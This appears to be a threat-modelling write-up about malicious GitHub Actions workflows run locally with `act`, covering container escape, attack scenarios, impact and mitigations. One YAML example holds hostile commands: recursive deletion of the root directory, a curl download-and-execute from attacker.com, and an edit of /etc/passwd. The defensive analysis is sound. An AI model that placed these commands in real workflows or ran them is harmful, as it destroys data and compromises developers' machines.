## Deep Analysis of Threat: Malicious Workflow Execution Leading to Local System Compromise in `act`

This document provides a deep analysis of the threat "Malicious Workflow Execution leading to Local System Compromise" within the context of an application utilizing `act` (https://github.com/nektos/act).

**1. Threat Breakdown and Attack Vectors:**

The core of this threat lies in the ability of `act` to execute GitHub Actions workflows locally using Docker. While this is a powerful feature for development and testing, it introduces a significant security risk if a malicious workflow is executed. Here's a breakdown of the attack vectors:

* **Direct Command Execution within the Container:** The most straightforward attack vector involves embedding malicious commands directly within the workflow steps. `act`'s Job/Step Executor, by design, executes these commands within the Docker container. While the container provides a degree of isolation, it's not a foolproof sandbox, especially if not configured with security in mind.

    * **Example:** A malicious workflow step might contain commands like:
        ```yaml
        - name: Malicious Step
          run: |
            rm -rf / # Attempt to delete files on the host (if container escapes)
            curl -o /tmp/evil_script https://attacker.com/evil.sh && chmod +x /tmp/evil_script && /tmp/evil_script # Download and execute a malicious script
            echo "user=$USER" >> /etc/passwd # Attempt to modify system files (if container escapes)
        ```

* **Container Escape:**  A more sophisticated attack involves crafting commands that allow the attacker to escape the Docker container and gain direct access to the host system. This can be achieved through various techniques:

    * **Docker Socket Exploitation:** If the Docker socket (`/var/run/docker.sock`) is mounted into the container (which can be done intentionally or unintentionally in the workflow), the attacker can use the Docker API to manipulate the host system.
    * **Privileged Containers:** Running the container in privileged mode grants it almost all the capabilities of the host kernel, making escape trivial. While `act` doesn't inherently run containers in privileged mode, a malicious workflow could potentially attempt to escalate privileges or exploit vulnerabilities.
    * **Exploiting Kernel Vulnerabilities:**  If the host kernel has known vulnerabilities, a carefully crafted workflow could trigger them from within the container to gain host access.
    * **Mounting Sensitive Host Paths:**  If the workflow mounts sensitive directories from the host into the container (e.g., `/`, `/etc`, `/home`), the attacker can directly interact with these files.

* **Leveraging Existing Host Configuration:**  Even without escaping, the attacker can leverage existing configurations on the host that are accessible from within the container. This could include:

    * **Accessing Network Resources:** If the developer's machine has network access, the malicious workflow can use it to download further payloads, exfiltrate data, or perform attacks on other systems.
    * **Interacting with Local Services:** If the developer is running local services (e.g., databases, web servers), the workflow might be able to interact with them in unintended ways.
    * **Accessing Credentials:**  If the developer has stored credentials in easily accessible locations on their machine, the workflow could attempt to retrieve them.

**2. In-Depth Analysis of Affected Components:**

* **`act`'s Workflow Parser:** While not directly executing the malicious code, the Workflow Parser is the entry point for the threat. If the parser doesn't perform sufficient validation or sanitization of the workflow file, it will happily pass the malicious instructions to the Job/Step Executor. Specifically, it needs to be robust against:
    * **Unintended Code Execution:**  Ensuring that only valid workflow syntax is processed and that there are no ways to inject arbitrary code during parsing.
    * **Path Traversal:**  While less relevant to execution, the parser should prevent manipulation of file paths that could lead to accessing or modifying unintended files during parsing.

* **`act`'s Job/Step Executor:** This is the primary component responsible for executing the commands defined in the workflow steps. Its vulnerability lies in its inherent functionality: it interprets and runs the provided commands within the Docker container. Key areas of concern include:
    * **Lack of Command Sanitization:** The executor likely doesn't perform deep inspection or sanitization of the commands before executing them. It trusts the workflow file to contain legitimate instructions.
    * **Default Docker Configuration:** The default Docker configuration used by `act` might not be restrictive enough to prevent container escape or limit the impact of malicious commands.
    * **Privilege Management:** How `act` manages user privileges within the container is crucial. If the container runs with excessive privileges, it increases the risk of host compromise.
    * **Resource Limits:**  Lack of resource limits on the container could allow a malicious workflow to consume excessive CPU, memory, or disk I/O, leading to a denial-of-service on the developer's machine.

**3. Detailed Attack Scenarios:**

* **Scenario 1: Insider Threat - Backdoor Workflow:** A disgruntled developer introduces a seemingly innocuous workflow that, when triggered, installs a backdoor on their colleagues' machines. This backdoor could grant persistent remote access.

* **Scenario 2: Compromised Dependency - Malicious Action:** A developer includes a third-party GitHub Action in their workflow. This action, either intentionally malicious or compromised, contains code that attempts to escape the container and install malware.

* **Scenario 3: Accidental Execution - Phishing Attack:** A developer is tricked into downloading and running a malicious workflow file disguised as a legitimate one. This workflow immediately starts executing harmful commands upon invocation with `act`.

* **Scenario 4: Supply Chain Attack - Compromised Repository:** An attacker gains access to a repository containing shared workflows used by the development team. They modify a common workflow to include malicious steps, affecting all developers who use that workflow.

**4. Impact Assessment (Detailed):**

The impact of this threat is indeed **Critical**, as it can lead to:

* **Complete Compromise of the Developer's Local Machine:** This includes:
    * **Data Loss:** Deletion or encryption of critical files, including source code, personal documents, and sensitive data.
    * **Malware Infection:** Installation of viruses, trojans, ransomware, or spyware, potentially leading to further system compromise and data breaches.
    * **Credential Theft:**  Stealing passwords, API keys, and other sensitive credentials stored on the machine.
    * **Unauthorized Access:** Gaining access to local resources, applications, and potentially other systems the developer has access to.
* **Lateral Movement:** If the compromised developer's machine has network access to other internal systems, the attacker can use it as a pivot point to gain access to those systems, escalating the attack within the organization.
* **Loss of Productivity:**  The time required to remediate the compromised machine, reinstall software, and recover data can significantly impact developer productivity.
* **Reputational Damage:** If the compromise leads to a wider security incident involving customer data or critical infrastructure, it can severely damage the organization's reputation.
* **Legal and Regulatory Consequences:** Depending on the data accessed and the industry, the organization might face legal and regulatory penalties due to the security breach.

**5. Affected Components (Revisited):**

* **`act`'s Workflow Parser:** Vulnerable to insufficient validation and sanitization.
* **`act`'s Job/Step Executor:**  Vulnerable due to its direct execution of commands within Docker containers without sufficient security controls.

**6. Risk Assessment (Detailed):**

* **Likelihood:**  Medium to High. While requiring a malicious workflow, the ease of creating and sharing such files, combined with the potential for insider threats or compromised dependencies, makes this a realistic scenario. Developers might also inadvertently execute malicious workflows if tricked.
* **Impact:** Critical (as detailed above).
* **Overall Risk:** Critical. The high potential impact outweighs the moderate likelihood, making this a top priority security concern.

**7. Mitigation Strategies (Elaborated):**

* **Code Review for Workflows:**
    * **Mandatory Reviews:** Implement a mandatory code review process for all workflow files before they are used, especially for shared or critical workflows.
    * **Focus on Security:** Train reviewers to specifically look for potentially malicious commands, container escape attempts, and excessive privileges.
    * **Automated Static Analysis:** Integrate static analysis tools that can scan workflow files for known security vulnerabilities and suspicious patterns.

* **Principle of Least Privilege in Workflows:**
    * **Avoid `sudo`:** Discourage or strictly control the use of `sudo` within workflow commands.
    * **Limit Container Capabilities:** Explore ways to reduce the capabilities granted to the Docker containers used by `act`.
    * **User Namespace Remapping:**  Investigate using Docker user namespace remapping to isolate the container's user IDs from the host's.

* **Use of Static Analysis Tools:**
    * **Workflow Linters:** Utilize linters specifically designed for GitHub Actions workflows to identify potential issues and enforce best practices.
    * **Security Scanners:** Integrate security scanners that can analyze the commands and scripts within workflows for known vulnerabilities or malicious patterns.

* **Isolated Testing Environment:**
    * **Virtual Machines or Dedicated Machines:**  Encourage developers to use virtual machines or dedicated testing machines for running workflows with unknown origins or those suspected of being malicious.
    * **Sandboxed Environments:** Explore the use of more robust sandboxing technologies beyond basic Docker containers for executing untrusted workflows.

* **Regular Security Training:**
    * **Awareness Training:** Educate developers about the risks associated with executing untrusted workflows and how to identify potentially malicious content.
